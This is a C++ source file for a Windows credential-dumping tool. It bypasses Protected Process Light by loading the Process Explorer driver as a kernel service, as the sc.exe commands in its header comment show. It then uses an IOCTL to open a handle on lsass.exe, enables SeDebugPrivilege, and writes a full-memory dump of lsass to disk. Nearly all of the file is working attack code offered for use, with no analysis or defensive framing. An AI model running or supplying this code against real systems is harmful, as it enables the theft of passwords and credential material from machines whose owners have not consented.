/*
Protected process light bypass using the Process Explorer driver

To load the driver drop PROCEXP.sys on disk, then:
sc.exe create ProcExp64 type= kernel start= auto binPath= C:\PATH\TO\PROCEXP.sys DisplayName= "ProcExp64"
net start ProcExp64 / sc.exe start ProcExp64

To cleanup unload the driver:
net stop ProcExp64 / sc.exe stop ProcExp64
sc.exe delete ProcExp64
*/

#include <Windows.h>
#include <iostream>
#include <WtsApi32.h>
#include <DbgHelp.h>

#pragma comment (lib, "Dbghelp.lib")
#pragma comment(lib, "Wtsapi32.lib")

#define IOCTL_OPEN_PROTECTED_PROCESS_HANDLE 0x8335003c 

// Enable/disable selected privilege on the target token
BOOL modify_privilege(HANDLE token, LPCTSTR privilege, bool enable_privilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
        printf("[!] LookupPrivilegeValue() failed with 0x%x\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (enable_privilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges() failed with 0x%x\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] The token does not have the specified privilege.\n");
        return FALSE;
    }

    return TRUE;
}

// Find process PID by name using the WTSEnumerateProcess technique
int find_process_pid(const char* process_name) {
    int pid = -1;
    WTS_PROCESS_INFOA* proc_info;
    DWORD proc_info_count = 0;

    if (!WTSEnumerateProcessesA(
        WTS_CURRENT_SERVER_HANDLE,
        0,
        1,
        &proc_info,
        &proc_info_count
    )) {
        printf("[!] WTSEnumerateProcessA failed.\n");
        return -1;
    }

    for (int i = 0; i < proc_info_count; i++) {
        if (lstrcmpiA(process_name, proc_info[i].pProcessName) == 0) {
            pid = proc_info[i].ProcessId;
            return pid;
        }
    }

    WTSFreeMemory(proc_info);
    return -1;
}


int main(int argc, char** argv)
{
    if (argc != 2) {
        printf("Usage: %s <output_file>\n", argv[0]);
        return 0;
    }

    // Enable SeDebugPrivilege
    // Having an handle on lsass.exe is not enought to dump its memory. The correct privileges are required.
    HANDLE current_token_handle = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &current_token_handle)) {
        printf("[!] OpenProcessToken() failed with 0x%x\n", GetLastError());
        return -1;
    }

    if (!modify_privilege(current_token_handle, L"SeDebugPrivilege", TRUE)) {
        printf("[!] Cannot enable SeDebugPrivilege\n");
        CloseHandle(current_token_handle);
        return -1;
    }
    CloseHandle(current_token_handle);

    // Open handle to the driver
    HANDLE driver = CreateFileA(
        "\\\\.\\PROCEXP152",
        GENERIC_ALL,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driver == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open an handle to driver.\n");
        return -1;
    }

    // Search for lsass.exe PID
    const char* lsass_proc_name = "lsass.exe";
    int lsass_pid = find_process_pid(lsass_proc_name);
    if (lsass_pid == -1) {
        printf("[!] Cannot find lsass.exe process ID.\n");
        CloseHandle(driver);
        return -1;
    }

    ULONGLONG ulonglong_lsass_pid = (ULONGLONG)lsass_pid;

    // Open handle to lsass.exe using the driver
    HANDLE lsass_handle = NULL;
    DWORD bytes_returned = 0;
    BOOL result = FALSE;

    result = DeviceIoControl(
        driver,
        IOCTL_OPEN_PROTECTED_PROCESS_HANDLE,
        (LPVOID)&ulonglong_lsass_pid,
        sizeof(ulonglong_lsass_pid),
        &lsass_handle,
        sizeof(HANDLE),
        &bytes_returned,
        NULL
    );

    if (bytes_returned == 0 || !result || lsass_handle == NULL) {
        printf("[!] DeviceIoControl failed.\n");
        CloseHandle(driver);
        return -1;
    }

    // Create the output file
    HANDLE outfile = CreateFileA(
        argv[1], // File path
        GENERIC_ALL, // Desired access
        0, // Share mode (not shared)
        NULL, // Security attributes
        CREATE_ALWAYS, // Create a new file, even if it does not exists
        FILE_ATTRIBUTE_NORMAL, // File attributes
        NULL // Template file (optional)
    );

    if (outfile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFile() failed with 0x%x\n", GetLastError());
        CloseHandle(driver);
        CloseHandle(lsass_handle);
        return -1;
    }

    // Dump lsass.exe with MiniDumpWriteDump
    if (!MiniDumpWriteDump(
        lsass_handle, // Handle obtained with the driver
        lsass_pid,
        outfile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    )) {
        printf("[!] MiniDumpWriteDump failed with 0x%x\n", GetLastError());
        CloseHandle(driver);
        CloseHandle(lsass_handle);
        CloseHandle(outfile);
        return -1;
    }
    CloseHandle(driver);
    CloseHandle(lsass_handle);
    CloseHandle(outfile);

    return 0;

}

